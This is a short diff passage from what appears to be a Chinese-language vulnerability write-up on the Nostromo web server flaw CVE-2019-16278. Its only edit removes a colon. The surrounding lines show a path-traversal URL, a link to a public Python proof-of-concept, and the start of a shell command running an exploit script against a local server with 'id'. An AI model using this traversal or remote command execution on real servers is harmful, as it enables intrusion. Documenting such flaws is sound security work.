@@ -14,7 +14,7 @@ http://www.example.org/..%2flogs/access_log
 Nostromo version <= 1.9.6
 
 ### 漏洞复现
-**Python POC：**https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py
+**Python POC**https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py
 
 ```
 mark@mark-Pc:~/nhttpd-exploits$ ./CVE-2019-16278.sh 127.0.0.1 80 id
